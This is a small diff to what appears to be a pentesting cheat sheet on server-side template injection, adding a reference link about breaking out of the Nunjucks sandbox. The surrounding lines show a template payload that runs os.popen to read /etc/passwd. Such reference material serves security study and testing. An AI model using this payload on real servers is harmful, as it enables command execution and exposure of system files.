@@ -412,6 +412,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injectio
 https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68  
 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf  
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection  
+http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine  
 
 ```
 {% import os %}{{ os.popen("cat /etc/passwd").read() }}
